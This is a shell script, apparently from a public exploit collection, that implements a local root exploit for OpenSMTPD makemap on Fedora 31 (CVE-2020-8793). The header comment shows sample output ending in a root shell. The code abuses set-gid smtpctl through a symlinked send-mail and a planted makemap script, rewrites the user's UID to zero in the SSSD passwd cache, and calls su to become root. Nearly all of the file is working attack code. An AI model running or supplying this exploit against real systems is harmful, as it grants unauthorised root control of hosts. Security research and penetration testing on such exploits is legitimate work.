#!/bin/sh
# opensmptd-makemap-lpe - Fedora 31 OpenSMTPD makemap local root exploit (CVE-2020-8793)
#
# Patched in opensmtpd-6.6.2p1-1.fc31
#
# Code mostly stolen from Qualys advisory:
# - https://www.openwall.com/lists/oss-security/2020/02/24/4
# ---
# [test@localhost ~]$ ./opensmptd-makemap-lpe
# Fedora 31 OpenSMTPD makemap local root exploit (CVE-2020-8793)
# [+] /usr/sbin/smtpctl is set-gid root
# [*] Linking /tmp/.g78yt4c7h0/send-mail -> /usr/sbin/smtpctl ...
# [*] Writing /tmp/.g78yt4c7h0/makemap ...
# [*] Running /tmp/.g78yt4c7h0/send-mail ...
# -d -bi -o dbname.db -
# uid=1001(test) gid=1001(test) egid=0(root) groups=0(root),1001(test) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
# [*] Running: /usr/bin/sed -i 's/\xe9\x03\x00\x00/\x00\x00\x00\x00/g' /var/lib/sss/mc/passwd
# [*] Cleaning up ...
# [*] Enter password for current user (test) when prompted.
# [*] Running /bin/su -l test ...
# Password: 
# [root@localhost ~]# id
# uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
# ---
# 2022-04-24 - <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/CVE-2020-8793

echo "Fedora 31 OpenSMTPD makemap local root exploit (CVE-2020-8793)"

smtpctl="/usr/sbin/smtpctl"

if [ ! -g "${smtpctl}" ]; then
  echo "${smtpctl} is not set-gid"
  exit 1
fi

if [ ! "$(stat "${smtpctl}" -c "%g")" -eq 0 ]; then
  echo "${smtpctl} is not set-gid root"
  exit 1
fi

echo "[+] ${smtpctl} is set-gid root"

base_dir="/tmp/.$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 10 | head -n 1)"

if [ ! -w `dirname "${base_dir}"` ]; then
  echo "[-] `dirname "${base_dir}"` directory is not writable"
  exit 1
fi

echo "[*] Linking ${base_dir}/send-mail -> ${smtpctl} ..."

mkdir -p "${base_dir}"
/bin/rm -f "${base_dir}/send-mail"
/bin/ln -s "${smtpctl}" "${base_dir}/send-mail"

echo "[*] Writing ${base_dir}/makemap ..."

# Lazily replace all instances (lol) of current user's ID
# with root's user ID (zero) in /var/lib/sss/mc/passwd
cat > "${base_dir}/makemap" << "EOF"
#!/bin/bash -p
echo "$@"
PATH="/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin"
/usr/bin/id
replace=$(/usr/bin/perl -0777 -e "print scalar reverse unpack 'h*', pack 'I>', '$(/bin/id -u)'" | sed 's/../\\x&/g')
cmd="/usr/bin/sed -i 's/${replace}/\x00\x00\x00\x00/g' /var/lib/sss/mc/passwd"
echo "[*] Running: ${cmd}"
exec /usr/bin/env -i /bin/bash -p -c "${cmd}"
EOF

/bin/chmod 0750 "${base_dir}/makemap"

echo "[*] Running ${base_dir}/send-mail ..."
PATH="${base_dir}" "${base_dir}/send-mail" -- -bi dbname

echo '[*] Cleaning up ...'
/bin/rm -rf "${base_dir}/"

current_user_name=$(whoami)
cmd="/bin/su -l ${current_user_name}"
echo "[*] Enter password for current user (${current_user_name}) when prompted."
echo "[*] Running ${cmd} ..."
$cmd

